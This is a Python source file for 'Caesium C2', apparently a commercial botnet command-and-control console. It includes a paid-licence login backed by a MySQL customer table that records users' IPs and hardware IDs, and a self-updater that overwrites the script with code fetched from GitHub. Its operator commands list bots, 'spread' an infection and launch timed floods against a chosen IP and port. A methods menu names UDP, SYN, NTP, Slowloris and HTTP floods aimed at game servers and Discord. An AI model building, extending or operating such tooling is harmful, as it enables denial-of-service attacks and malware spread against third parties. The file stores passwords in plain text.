import os
import sys
import cv2
import time
import socket
import msvcrt
import ctypes
import shutil
import datetime
import platform
import requests
import threading
import itertools
import subprocess
import mysql.connector
from mysql.connector import Error
from colorama import init, Fore as col , Style
from pystyle import Colors, Colorate, Center, Box

REMOTE_VERSION_URL = 'https://raw.githubusercontent.com/66644e/666/main/version.txt'
REMOTE_SCRIPT_URL = 'https://raw.githubusercontent.com/66644e/666/main/myscript.py'

LOCAL_VERSION = '1.0.0'  

ASPECT_RATIO = 1.5  

palletes = {
    "Ascii": ["⢀", "⡄", "⣆", "⠶", "⣴", "⢿", "⣿"],
    "Monochrome": ["▓", "▒", "░"]
}

modes = {
    "Use max terminal space": 2,
    "Maintain aspect ratio": 1,
}


# Database Creds
DB_HOST = ""
DB_USER = ""
DB_PASSWORD = ""
DB_DATABASE = ""

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def set_terminal_title(title):
    if os.name == 'nt':  # Windows
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:  # macOS/Linux
        sys.stdout.write(f"\33]0;{title}\a")
        sys.stdout.flush()

def login():
    def getpassword(prompt="                                    Password: "):
        print(prompt, end='', flush=True)
        password = ''

        if os.name == 'nt':  
            while True:
                ch = msvcrt.getch()
                if ch in (b'\r', b'\n'):  
                    break
                elif ch == b'\x08':  
                    if len(password) > 0:
                        password = password[:-1]
                        sys.stdout.write('\b \b')
                elif ch in (b'\x00', b'\xe0'):  
                    msvcrt.getch()  
                else:
                    char = ch.decode('utf-8', errors='ignore')
                    password += char
                    sys.stdout.write('•')
                sys.stdout.flush()

        else:
            import tty
            import termios

            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)

            try:
                tty.setraw(fd)
                while True:
                    ch = sys.stdin.read(1)
                    if ch in ('\r', '\n'):
                        break
                    elif ch == '\x7f':
                        if len(password) > 0:
                            password = password[:-1]
                            sys.stdout.write('\b \b')
                    else:
                        password += ch
                        sys.stdout.write('•')
                    sys.stdout.flush()
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

        print()
        return password
    
    x = f'''
           ╔═╗┌─┐┌─┐┌─┐┬┬ ┬┌┬┐ ╔═╗ ╔═╗
           ║  ├─┤├┤ └─┐││ ││││ ║   ╔═╝
           ╚═╝┴ ┴└─┘└─┘┴└─┘┴ ┴ ╚═╝ ╚══
    ╚═══════╦═════════════════════════╦═══════╝
╔═══════════╩═════════════════════════╩═══════════╗
║                [ Authorization ]                ║
╠═════════════════════════════════════════════════╣
║. +':. o   ~  ' . *  .-. ~ ' . ' '. '*' * .  * ' ║
║  .*'::._' * -.''  '' ' '   .*. ' . .-. ' . ' '  ║
║         ___̴ı̴̴̡̡̡ ̡͌l̡̡̡ ̡͌l̡*̡̡ ̴̡ı̴̴̡ ̡̡͡|̲̲̲͡͡͡ ̲▫̲͡ ̲̲̲͡͡π̲̲͡͡ ̲̲͡▫̲̲͡͡ ̲|̡̡̡ ̡ ̴̡ı̴̡̡ ̡͌l̡̡̡̡.___          ║
╠═════════════════════════════════════════════════╣
║{col.WHITE}{Style.BRIGHT}[!] Please enter your credentials to continue [!]{Style.NORMAL}{col.BLUE}║{col.RESET}	
╚═════════════════════════════════════════════════╝
    '''
    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(x,spaces=35), 2))

    try:
        connection = mysql.connector.connect(
            host=DB_HOST,
            user=DB_USER,
            password=DB_PASSWORD,
            database=DB_DATABASE
        )
        if connection.is_connected():
            print(Center.XCenter(f"Server Status: {col.GREEN}Connected{col.RESET}\n\n",spaces=47))
    except Error as e:
        print(Center.XCenter( "  " + f"Server Status: {col.RED}Failed to Connect{col.RESET}"))
        time.sleep(5)
        return

    try:
        cursor = connection.cursor()
        create_table_query = """
CREATE TABLE IF NOT EXISTS customers (
    uuid CHAR(36) NOT NULL PRIMARY KEY,
    discord_id BIGINT NOT NULL,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    ip VARCHAR(45) NOT NULL DEFAULT 'N/A',
    hwid VARCHAR(255) NOT NULL DEFAULT 'N/A',
    first_login BOOLEAN DEFAULT TRUE,
    whitelisted BOOLEAN DEFAULT FALSE,
    plan VARCHAR(255) NOT NULL DEFAULT 'N/A',
    plan_expiry DATETIME DEFAULT NULL
);
        """
        cursor.execute(create_table_query)
        connection.commit()
    except Error as e:
        print("Error while creating table:", e)

    def check_login(username, password, ip_address, hwid):
        try:
            cursor = connection.cursor(dictionary=True)
            query = "SELECT * FROM customers WHERE username = %s AND password = %s"
            cursor.execute(query, (username, password))
            user = cursor.fetchone()

            if not user:
                print(Center.XCenter(f"\n\n{Style.BRIGHT}{col.RED}Invalid username or password.{col.RESET}",spaces=45))
                return False

            if not user['whitelisted']:
                print(Center.XCenter(f"\n\n{Style.BRIGHT}{col.YELLOW}Can't use program{col.WHITE}: {col.RED}You are not whitelisted.{col.RESET}",spaces=38))
                return False

            if user['first_login']:
                update_query = """
                    UPDATE customers
                    SET ip = %s,
                        hwid = %s,
                        first_login = FALSE
                    WHERE uuid = %s
                """
                cursor.execute(update_query, (ip_address, hwid, user['uuid']))
                connection.commit()

            return True  

        except Error as e:
            print("Error while checking login:", e)
            return False

    while True:
        try:
            username = input(f"\n                                    {Style.BRIGHT}{col.WHITE}Username: ").lower()
            print("")
            password = getpassword().lower()
            ip = requests.get("https://api.ipify.org").text
            current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()


            if check_login(username, password,ip,hwid=current_machine_id):
                play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Loading.gif".format(os.getcwd()),speed=1.3)
                clear()
                try:
                    connect_as_commander("127.0.0.1", 65432, username)
                except ConnectionRefusedError:
                    clear()
                    print(Center.Center("""{}{}
                        .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄            ·▄▄▄·▄▄▄▄▄▌  ▪   ▐ ▄ ▄▄▄ .         
                        ▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·    ▪     ▐▄▄·▐▄▄·██•  ██ •█▌▐█▀▄.▀·         
                        ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄      ▄█▀▄ ██▪ ██▪ ██▪  ▐█·▐█▐▐▌▐▀▀▪▄         
                        ▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌    ▐█▌.▐▌██▌.██▌.▐█▌▐▌▐█▌██▐█▌▐█▄▄▌         
                         ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀     ▀█▄▀▪▀▀▀ ▀▀▀ .▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀  ▀  ▀  ▀   {}{}                                                                  
                    """.format(Style.DIM,col.RED, Style.RESET_ALL,col.RESET)))
                    while True:
                        time.sleep(5)

            else:
                time.sleep(3)
                clear()
                print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(x,spaces=35), 2))
                try:
                    connection = mysql.connector.connect(
                        host=DB_HOST,
                        user=DB_USER,
                        password=DB_PASSWORD,
                        database=DB_DATABASE
                    )
                    if connection.is_connected():
                        print(Center.XCenter(f"Server Status: {col.GREEN}Connected{col.RESET}\n\n",spaces=47))
                except Error as e:
                    print(Center.XCenter(f"Server Status: {col.RED}Failed to Connect{col.RESET}"))
                    time.sleep(3)
                    return

        except KeyboardInterrupt:
            print("\nProgram exited.")
            break

    connection.close()

def banner():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    
    banner_text = f"""
[38;2;163;111;174m                   ╔═╗╔═╗╔═╗╔═╗╦╦ ╦╔╦╗[0m
[38;2;149;111;174m                   ║  ╠═╣║╣ ╚═╗║║ ║║║║[0m
[38;2;136;120;174m                   ╚═╝╩ ╩╚═╝╚═╝╩╚═╝╩ ╩𐋄ᕓ[0m
[38;2;136;120;174m               ╚════╦═══════════════╦════╝
[38;2;123;111;174m╔═══════════════════╩═══════════════╩═══════════════════╗[0m
[38;2;117;112;174m║               \x1b[38;2;255;255;255m~ Welcome to Caesium C2 ~[38;2;117;112;174m               ║[0m
[38;2;111;114;174m║          \x1b[38;2;255;255;255mType [help] for a list of commands[38;2;111;114;174m           ║[0m
[38;2;111;120;174m╚═══════════════════════════════════════════════════════╝[0m
[38;2;111;124;174m            \033[1;31m⛧[0m Join, discord.gg/4vYV7MC2vf \033[1;31m⛧[0m
[38;2;111;128;174m╔════════════════════════════════════════════════════════╗[0m
[38;2;111;128;174m║   \x1b[38;2;255;255;255mCopyright © 2025 Caesium C2 - All Rights Reserved.[38;2;111;128;174m   ║[0m
[38;2;111;128;174m╚════════════════════════════════════════════════════════╝[0m




        """
    
    print(Center.Center(banner_text,yspaces=2,xspaces=30))

def update():
    spinner_running = True

    def spinner(message):
        for symbol in itertools.cycle(['|', '/', '-', '\\']):
            if not spinner_running:
                break
            sys.stdout.write(f'\r{message} {symbol}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * (len(message) + 2) + '\r')

    def run_with_spinner(task_func, message):
        nonlocal spinner_running
        spinner_running = True
        thread = threading.Thread(target=spinner, args=(message,))
        thread.start()
        try:
            result = task_func()
        finally:
            spinner_running = False
            thread.join()
        return result

    local_path = os.path.realpath(__file__)
    backup_path = local_path + ".bak"

    try:
        # Step 1: Check for update
        def fetch_version():
            response = requests.get(REMOTE_VERSION_URL, timeout=5)
            response.raise_for_status()
            return response.text.strip()

        remote_version = run_with_spinner(fetch_version, "Checking for updates...")

        if remote_version == LOCAL_VERSION:
            print("[✓] You are running the latest version.")
            return

        print(f"\n[Update] New version available: {remote_version}")

        # Step 2: Download latest version
        def fetch_script():
            response = requests.get(REMOTE_SCRIPT_URL, timeout=10)
            response.raise_for_status()
            return response.text

        new_code = run_with_spinner(fetch_script, "Downloading update...")

        # Step 3: Backup current script
        print("[Update] Backing up current script...")
        shutil.copyfile(local_path, backup_path)

        # Step 4: Replace with new code
        print("[Update] Applying update...")
        with open(local_path, 'w', encoding='utf-8') as f:
            f.write(new_code)

        print(f"[✓] Script updated successfully to version {remote_version}")

        # Step 5: Restart
        print("[Update] Restarting...")
        time.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        print(f"\n[Error] Update failed: {e}")

def handle_response(client):
    while True:
        try:
            response = client.recv(1024).decode('utf-8')
            if response:
                if "Connected clients:" in response:
                    print(response)
                elif "[TITLE_UPDATE]" in response:
                    NewCLI = str(response).replace("[TITLE_UPDATE]","")
                    set_terminal_title(NewCLI)
                else:
                    print(response)

        except socket.error as e:
            print(f"Error receiving data: {e}")
            continue
        except ConnectionError:
            print(col.RED,"Server Offline...")

def send_command(client, command):
    try:
        client.send(command.encode('utf-8'))
    except socket.error as e:
        print(f"Error sending data: {e}")

def grayscale(rgb):
    r, g, b = int(rgb[0]), int(rgb[1]), int(rgb[2])
    return (r + g + b) / 3

def play_ascii_video(ascii_choice, mode_choice, video_path, speed=1.0):
    ascii_scheme = palletes[ascii_choice]
    mode = modes[mode_choice]

    video = cv2.VideoCapture(video_path)

    def print_frame(img, frame_time):
        current_time = time.time()

        terminal = os.get_terminal_size()
        term_width, term_height = terminal.columns, terminal.lines
        if term_width % 2 != 0:
            term_width -= 1

        height, width = img.shape[0], img.shape[1]
        original_ratio = width / height

        width_ratio = term_width / width
        height_ratio = term_height / height

        if mode == 1:
            width_ratio = height_ratio * original_ratio * ASPECT_RATIO

        small_img = cv2.resize(img, (0, 0), fx=width_ratio, fy=height_ratio)
        small_height, small_width = small_img.shape[0], small_img.shape[1]
        magic_num = 255 / (len(ascii_scheme) - 1.001)

        ascii_art = ""
        for col in small_img:
            size_difference = term_width - small_width
            if size_difference > 1:
                ascii_art += " " * int(size_difference / 2 + 1)
            for row in col:
                brightness = grayscale(row)
                char = ascii_scheme[int(brightness // magic_num)]
                ascii_art += f'\x1b[38;2;{row[2]};{row[1]};{row[0]}m{char}'
            ascii_art += "\n"

        print(ascii_art[:-1], end="")

        while time.time() - current_time <= frame_time:
            pass
        sys.stdout.write(f"\033[{small_height + 1}F")

    fps = video.get(cv2.CAP_PROP_FPS)
    frame_time = (1 / fps) / speed  

    while True:
        success, image = video.read()
        if success:
            print_frame(image, frame_time)
        else:
            break

def connect_as_commander(host, port, username):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(username.encode('utf-8'))  
    banner()
    
    threading.Thread(target=handle_response, args=(client,), daemon=True).start()
    
    while True:
        username_cap = str(username).capitalize()

        start_rgb = (136, 120, 174)
        end_rgb = (111, 128, 174) 

        full_text = username_cap + "@CaesiumC2"
        total_len = len(full_text)

        gradient_prompt = "                               \033[38;2;136;120;174m└\033[0m" + "\033[38;2;142;115;180m[\033[0m"
        for i, char in enumerate(full_text):
            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * i / (total_len - 1))
            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * i / (total_len - 1))
            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * i / (total_len - 1))
            gradient_prompt += f"\033[38;2;{r};{g};{b}m{char}"

        gradient_prompt += "[38;2;111;128;174m]\033[38;2;238;35;255m ➣ \033[0m"

        command = input(gradient_prompt)
        
        if command.lower() == "exit":
            print(Colorate.Horizontal(Colors.red_to_black, "Exiting..."))
            break

        elif command.lower() == "help":
            clear()
            play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Help.gif".format(os.getcwd()),speed=1.0)
            play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Help.gif".format(os.getcwd()),speed=1.0)
            play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Help.gif".format(os.getcwd()),speed=1.0)
            clear()
            print(Center.XCenter("""
    \033[38;2;219;159;217m                    ╦ ╦╔═╗╦  ╔═╗    ╔╦╗╔═╗╔╗╔╦ ╦
    \033[38;2;209;165;218m                    ╠═╣║╣ ║  ╠═╝    ║║║║╣ ║║║║ ║
    \033[38;2;189;175;218m                    ╩ ╩╚═╝╩═╝╩      ╩ ╩╚═╝╝╚╝╚═╝
    \033[38;2;179;180;219m─════════════════════════════════ቐቐ════════════════════════════════─
    \033[38;2;169;185;219m    • help: Show this message.
    \033[38;2;165;186;219m    • list: List active bots.
    \033[38;2;163;186;219m    • clear: Clears terminal.
    \033[38;2;163;186;219m    • spread: spreads the zombie virus.  
    \033[38;2;161;186;219m    • attack: Executes the attack.
    \033[38;2;160;186;219m    • methods: Show available attack methods.
    \033[38;2;159;185;219m    • exit: Exit the command interface.\033[0m
                                 


                                      """,spaces=28))
        
        elif command.lower() == "list":
            send_command(client, command)
        
        elif command.lower() =="stop":
            send_command(client, command)
            play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Stop.gif".format(os.getcwd()),speed=2.0)
            clear()
            banner()
        
        elif command.lower() == "cls" or command.lower() == "clear":
            clear()
            banner()

        elif command.lower().startswith("attack"):
                parts = command.strip().split()

                if len(parts) != 5:
                    print(Center.XCenter("{}Error: Usage is attack <method> <ip> <port> <time>{}".format(col.RED,col.RESET)))
                else:
                    _, method, ip, port, time = parts

                    if not (method and ip and port and time):
                        print("Error: All fields must be filled out.")
                    else:
                        play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Launch.gif".format(os.getcwd()),speed=3.0)
                        clear()
                        send_command(client, command)
                        args = command.split()
                        print(Center.XCenter("""
\033[38;2;219;159;217m                ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗
\033[38;2;214;163;217m                ╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║ 
\033[38;2;209;167;217m                ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩ 
\033[38;2;204;171;217m            ╚══════╦════════════════════════╦══════╝
\033[38;2;199;174;217m╔══════════════════╩════════════════════════╩══════════════════╗
\033[38;2;194;178;217m║ \033[37mTARGET: [\033[0m\033[95m{}\033[37m]\033[0m
\033[38;2;189;182;217m║ \033[37mPORT: [\033[0m\033[95m{}\033[37m]\033[0m
\033[38;2;184;185;218m║ \033[37mTIME: [\033[0m\033[95m{}\033[37m]\033[0m
\033[38;2;179;187;218m║ \033[37mMETHOD: [\033[0m\033[95m{}\033[37m]\033[0m
\033[38;2;174;190;218m║ \033[37mTIME STARTED: [\033[0m\033[95m{}\033[37m]\033[0m
\033[38;2;169;192;218m╚══════════════════════════════════════════════════════════════╝ 



""".format(args[2],args[3],args[4],args[1],datetime.datetime.now().strftime("%m/%d/%Y | %I:%M %p")), spaces=27))
       
        elif command.lower() == "methods":
            play_ascii_video("Monochrome","Use max terminal space","{}/Assets/Transation.gif".format(os.getcwd()),speed=2.0)
            clear()
            print(Center.XCenter("""
\033[38;2;219;159;217m                     ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[38;2;214;163;217m                     ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[38;2;209;167;217m                     ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[38;2;204;171;217m            ╚══════╦════════════════════════╦═══════╝
\033[38;2;199;174;217m╔══════════════════╩════╦══════════════╦════╩══════════════════╗
\033[38;2;194;178;217m║        LAYER 4        ║    COMBOS    ║        LAYER 7        ║
\033[38;2;189;182;217m╠═══════════════════════╬══════════════╬═══════════════════════╣
\033[38;2;184;185;218m║  • UDP     • NTP      ║ • DNS + SYN  ║ • R.U.D.Y             ║     
\033[38;2;179;187;218m║  • TCP     • ACK      ║ • SYN + RST  ║ • HTTP-GET            ║
\033[38;2;174;190;218m║  • SYN     • RST      ║ • TCP + UDP  ║ • HTTP-POST           ║
\033[38;2;169;192;218m║  • DNS     • IPF      ║ • ICMP + UDP ║ • Slowloris           ║
\033[38;2;164;195;219m║  • ICMP    • SSDP     ║              ║ • DNS Query           ║
\033[38;2;159;197;219m║  • Smurf   • LAND     ║              ║ • VSE Server          ║
\033[38;2;159;193;218m╠═════════════════════╦═╩══════════════╩═╦═════════════════════╣
\033[38;2;159;189;218m║        GAMES        ║      BYPASS      ║      SOFTWARES      ║
\033[38;2;159;186;218m╠═════════════════════╬══════════════════╬═════════════════════╣
\033[38;2;159;185;219m║  • FiveM            ║ • Coming Soon!   ║  • Discord          ║
\033[38;2;159;185;219m║  • Roblox           ║                  ║                     ║               
\033[38;2;159;185;219m╚═══╦═════════════════╩══════════════════╩═════════════╦═══════╝   
\033[38;2;159;185;219m    ║    Usage: attack <<METHOD>> <<HOST>> <<PORT>>    ║ 
\033[38;2;159;185;219m    ╚══════════════════════════════════════════════════╝
\033[0m

                                 

            """,spaces=30))
        
        elif command.lower() == "spread":
            play_ascii_video("Ascii","Use max terminal space","{}/Assets/Spread.gif".format(os.getcwd()),speed=1.0)
            send_command(client, command)
            clear()
            banner()

        else:
            print(Center.XCenter(f"\n{col.RED}Invalid command. Please try again.{col.RESET}\n\n",spaces=43))
            time.sleep(3)
            clear()
            banner()
        
    client.close()

def animate_fade_banner(colors, speed=0.05, direction='forward', banner=None):
    set_terminal_title("Caesium C2")
    init()

    if banner is None:
        banner = Center.Center("""
 ██████╗ █████╗ ███████╗███████╗██╗██╗   ██╗███╗   ███╗     ██████╗██████╗ 
██╔════╝██╔══██╗██╔════╝██╔════╝██║██║   ██║████╗ ████║    ██╔════╝╚════██╗
██║     ███████║█████╗  ███████╗██║██║   ██║██╔████╔██║    ██║      █████╔╝
██║     ██╔══██║██╔══╝  ╚════██║██║██║   ██║██║╚██╔╝██║    ██║     ██╔═══╝ 
╚██████╗██║  ██║███████╗███████║██║╚██████╔╝██║ ╚═╝ ██║    ╚██████╗███████╗
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚═════╝╚══════╝
        """)

    def lerp(a, b, t):
        return int(a + (b - a) * t)

    def hex_to_rgb(hex_color):
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    def gradient_steps(start_hex, end_hex, steps):
        start_rgb = hex_to_rgb(start_hex)
        end_rgb = hex_to_rgb(end_hex)
        return [
            (
                lerp(start_rgb[0], end_rgb[0], t / (steps - 1)),
                lerp(start_rgb[1], end_rgb[1], t / (steps - 1)),
                lerp(start_rgb[2], end_rgb[2], t / (steps - 1))
            ) for t in range(steps)
        ]

    lines = banner.strip('\n').split('\n')
    line_count = len(lines)

    if direction == 'reverse':
        colors = list(reversed(colors))

    color_pairs = [(colors[i], colors[(i + 1) % len(colors)]) for i in range(len(colors))]

    stop_flag = {"stop": False}

    def run_animation():
        sys.stdout.write("\033[?25l")  
        try:
            while not stop_flag["stop"]:
                for start, end in color_pairs:
                    if stop_flag["stop"]:
                        break
                    gradient = gradient_steps(start, end, line_count)
                    sys.stdout.write("\033[H") 
                    for i, line in enumerate(lines):
                        r, g, b = gradient[i]
                        sys.stdout.write(f"\033[38;2;{r};{g};{b}m{line}\033[0m\n")
                    sys.stdout.flush()
                    time.sleep(speed)
        finally:
            sys.stdout.write("\033[?25h")  
            sys.stdout.flush()

    thread = threading.Thread(target=run_animation)
    thread.daemon = True
    thread.start()

    try:
        time.sleep(3)
    finally:
        stop_flag["stop"] = True
        thread.join()
        clear()
        login()

if __name__ == "__main__":
    rainbow_colors = [
        "#FF0000", "#FF7F00", "#FFFF00",
        "#00FF00", "#0000FF", "#4B0082", "#8B00FF"
    ]
    update()
    #animate_fade_banner(colors=rainbow_colors, speed=0.000001, direction='forward')
    try:
        pass
    except ConnectionRefusedError:
        clear()
        print(Center.Center("""{}{}
                        .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄            ·▄▄▄·▄▄▄▄▄▌  ▪   ▐ ▄ ▄▄▄ .         
                        ▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·    ▪     ▐▄▄·▐▄▄·██•  ██ •█▌▐█▀▄.▀·         
                        ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄      ▄█▀▄ ██▪ ██▪ ██▪  ▐█·▐█▐▐▌▐▀▀▪▄         
                        ▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌    ▐█▌.▐▌██▌.██▌.▐█▌▐▌▐█▌██▐█▌▐█▄▄▌         
                         ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀     ▀█▄▀▪▀▀▀ ▀▀▀ .▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀  ▀  ▀  ▀   {}{}                                                                  
                    """.format(Style.DIM,col.RED, Style.RESET_ALL,col.RESET)))
        while True:
            time.sleep(5)
